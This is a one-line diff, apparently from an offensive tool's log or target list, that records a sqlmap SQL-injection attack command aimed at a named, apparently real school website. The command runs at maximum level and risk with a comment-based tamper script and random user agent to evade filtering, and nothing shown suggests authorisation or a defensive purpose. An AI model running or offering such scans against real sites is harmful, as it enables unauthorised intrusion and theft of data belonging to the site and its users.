@@ -1,0 +1,1 @@
+https://kodaschool.united.sd (GET)  # /data/data/com.termux/files/usr/bin/sqlmap -u https://kodaschool.united.sd --batch --level 5 --risk 3 --output-dir /data/data/com.termux/files/home/FALCON/data/sqlmap_output --tamper space2comment --random-agent --flush-session
